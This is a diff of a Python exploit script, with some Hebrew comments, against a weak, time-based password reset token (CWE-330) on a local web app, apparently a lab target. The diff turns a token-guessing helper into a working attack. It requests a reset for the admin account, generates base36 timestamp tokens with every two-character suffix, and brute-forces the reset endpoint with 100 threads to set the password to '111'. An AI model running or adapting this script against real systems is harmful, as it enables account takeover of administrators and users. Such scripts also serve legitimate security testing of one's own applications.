@@ -1,12 +1,16 @@
 ## Weak/Predictable Password Reset Token (CWE-330)
 import requests
 import time
+import itertools
+from concurrent.futures import ThreadPoolExecutor
 
-URL = "http://localhost:3001/api/auth/reset-request"
-PAYLOAD = {"email": "admin@hemi-emperium.local"}
+alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
+URL_REQ = "http://localhost:3001/api/auth/reset-request"
+PAYLOAD_REQ = {"email": "admin@hemi-emporium.local"}
+session = requests.Session()
 
+URL_RESET = "http://localhost:3001/api/auth/reset-password"
 def base36encode(number):
-    alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
     base36 = ''
     while number:
         number, i = divmod(number, 36)
@@ -18,27 +22,41 @@ start_time = int(time.time() * 1000)
 
 # שליחת בקשה אחת כדי לצמצם את חלון הזמן
 try:
-    requests.post(URL, json=PAYLOAD, timeout=2)
+    response = session.post(URL_REQ, json=PAYLOAD_REQ, timeout=2)
+    print(response.json())
 except Exception as e:
-    print(f"שגיאה בשליחה: {e}")
+    print(f"ERROR: {e}")
 
 # מדידת זמן סיום
 end_time = int(time.time() * 1000)
 
 window = end_time - start_time
 
-print(f"זמן התחלה: {start_time}")
-print(f"זמן סיום: {end_time}")
-print(f"חלון זמן: {window} אלפיות שנייה\n")
+print(f"Start time: {start_time}")
+print(f"End time: {end_time}")
+print(f"Time window: {window} milliseconds\n")
 
-print("10 טוקנים פוטנציאליים לניסוי:")
+# מעבר על כל מילי-שנייה בטווח הזמן
+all_tokens = []
+# הוספה של כל שילוב אפשרי של שתי אותיות בסוף הטוקן
+suffixes = [''.join(p) for p in itertools.product(alphabet, repeat=2)]
 
-# מניעת חלוקה באפס אם השרת הגיב מהר מדי
-if window < 10:
-    step = 1
-else:
-    step = window // 10
+for ts in range(start_time, end_time + 1):
+    base_token = base36encode(ts)
+    print(base_token)
+    for suffix in suffixes:
+        all_tokens.append(base_token + suffix)
 
-for i in range(10):
-    ts = start_time + (i * step)
-    print(f"{i+1}. {base36encode(ts)}")
+def check_token(token):
+    try:
+        PAYLOAD_RESET = {"token": token, "newPassword": "111"}
+        response = session.post(URL_RESET, json=PAYLOAD_RESET, timeout=2)
+        if response.json().get("success"):
+            print(f"Token: {token} - Worked!")
+        # else:
+        #     print(f"Token: {token} - Failed.")
+    except Exception as e:
+        print(f"ERROR: {e}")
+        
+with ThreadPoolExecutor(max_workers=100) as executor:
+    executor.map(check_token, all_tokens)
